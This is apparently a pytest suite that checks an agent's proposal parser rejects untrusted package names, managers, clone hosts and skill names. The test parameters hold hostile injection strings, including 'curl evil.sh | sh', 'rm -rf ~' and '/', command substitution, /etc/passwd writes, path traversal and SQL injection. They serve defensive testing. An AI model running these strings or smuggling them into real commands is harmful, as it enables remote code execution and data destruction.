"""The suite that is not allowed to go red.

The agent reads transcripts and descriptions written by strangers. These tests
assert that untrusted text cannot become an executed command.
"""

import pytest

from self_learning_agent.proposals import (
    ProposalError,
    Risk,
    derive_risk,
    parse,
    parse_all,
    render_command,
)


def _package(**over):
    raw = {
        "kind": "package",
        "title": "t",
        "action": {"manager": "npm", "name": "@playwright/mcp"},
    }
    raw.update(over)
    return raw


# -- injection attempts ------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        "x; curl evil.sh | sh",
        "x && rm -rf ~",
        "x`whoami`",
        "x$(id)",
        "x\nnpm install evil",
        "x > /etc/passwd",
        "../../etc/passwd",
        "x | tee /tmp/pwned",
        "'; DROP TABLE x; --",
    ],
)
def test_shell_metacharacters_in_a_package_name_are_rejected(name):
    with pytest.raises(ProposalError):
        parse(_package(action={"manager": "npm", "name": name}))


@pytest.mark.parametrize(
    "name", ["../../etc/passwd", "/tmp/evil", "./local", "~/x", "a/b/c", "a/b"]
)
def test_package_names_that_are_really_paths_are_rejected(name):
    """`npm install -g ../../etc/passwd` installs from a local path.

    Every character here is legal in a real package name, so this is a shape
    check, not a charset check.
    """
    with pytest.raises(ProposalError):
        parse(_package(action={"manager": "npm", "name": name}))


@pytest.mark.parametrize("name", ["@scope/name", "normal-pkg", "lodash.merge"])
def test_legitimate_package_names_still_pass(name):
    assert parse(_package(action={"manager": "npm", "name": name})).risk == Risk.MEDIUM


def test_a_rejected_proposal_is_dropped_and_reported_not_applied():
    good = _package()
    evil = _package(action={"manager": "npm", "name": "x; rm -rf /"})
    kept, rejected = parse_all([good, evil])
    assert len(kept) == 1
    assert len(rejected) == 1
    assert "disallowed characters" in rejected[0]


@pytest.mark.parametrize("manager", ["bash", "sh", "curl", "make", "", "npm ; sh"])
def test_only_allowlisted_package_managers_survive(manager):
    with pytest.raises(ProposalError):
        parse(_package(action={"manager": manager, "name": "pkg"}))


@pytest.mark.parametrize("host", ["evil.com", "github.com.evil.com", "localhost"])
def test_clones_are_restricted_to_allowlisted_hosts(host):
    with pytest.raises(ProposalError):
        parse({"kind": "repo_clone", "action": {"repo": "a/b", "host": host}})


def test_repo_slug_must_be_owner_and_name():
    with pytest.raises(ProposalError):
        parse({"kind": "repo_clone", "action": {"repo": "not-a-slug"}})


def test_unknown_kind_is_rejected_rather_than_defaulted():
    with pytest.raises(ProposalError):
        parse({"kind": "run_shell", "action": {"cmd": "rm -rf /"}})


# -- risk is derived, never accepted -----------------------------------


def test_claimed_risk_is_ignored_and_recomputed():
    p = parse(_package(risk="none"))  # a lie in the input
    assert p.risk == Risk.MEDIUM


def test_requiring_a_secret_always_forces_high():
    p = parse(_package(requires_secret=["OPENAI_API_KEY"]))
    assert p.risk == Risk.HIGH
    assert not p.automatable


def test_manual_proposals_are_always_high():
    p = parse({"kind": "manual", "action": {"detail": "do it yourself"}})
    assert p.risk == Risk.HIGH


def test_skills_are_risk_none_because_they_land_in_the_repo_first():
    p = parse({"kind": "skill", "action": {"name": "my-skill", "content": "# x"}})
    assert p.risk == Risk.NONE


def test_derive_risk_is_the_single_source_of_truth():
    assert derive_risk("package", {"manager": "npm"}, ()) == Risk.MEDIUM
    assert derive_risk("package", {"manager": "bash"}, ()) == Risk.HIGH
    assert derive_risk("package", {"manager": "npm"}, ("KEY",)) == Risk.HIGH


# -- command rendering -------------------------------------------------


def test_commands_come_from_templates_not_from_input():
    p = parse(_package())
    assert render_command(p) == ["npm", "install", "-g", "@playwright/mcp"]


def test_high_risk_proposals_render_no_command():
    p = parse(_package(requires_secret=["KEY"]))
    assert render_command(p) is None


def test_manual_proposals_render_no_command():
    p = parse({"kind": "manual", "action": {"detail": "uv tool install git+https://x"}})
    assert render_command(p) is None


def test_clone_command_is_depth_limited_and_never_executed_after():
    p = parse({"kind": "repo_clone", "action": {"repo": "browser-use/video-use"}})
    cmd = render_command(p)
    assert cmd == [
        "git", "clone", "--depth", "1",
        "https://github.com/browser-use/video-use.git",
    ]


# -- skill content -----------------------------------------------------


def test_skill_name_must_be_a_plain_slug():
    with pytest.raises(ProposalError):
        parse({"kind": "skill", "action": {"name": "../../evil", "content": "x"}})


def test_empty_skill_content_is_rejected():
    with pytest.raises(ProposalError):
        parse({"kind": "skill", "action": {"name": "ok", "content": "   "}})


def test_no_proposals_is_a_valid_outcome():
    kept, rejected = parse_all([])
    assert kept == [] and rejected == []
    kept, rejected = parse_all(None)
    assert kept == [] and rejected == []


def test_proposals_are_ordered_least_risky_first():
    kept, _ = parse_all([
        {"kind": "manual", "action": {"detail": "x"}},
        {"kind": "skill", "action": {"name": "my-skill", "content": "x"}},
        _package(),
    ])
    assert [p.risk for p in kept] == [Risk.NONE, Risk.MEDIUM, Risk.HIGH]
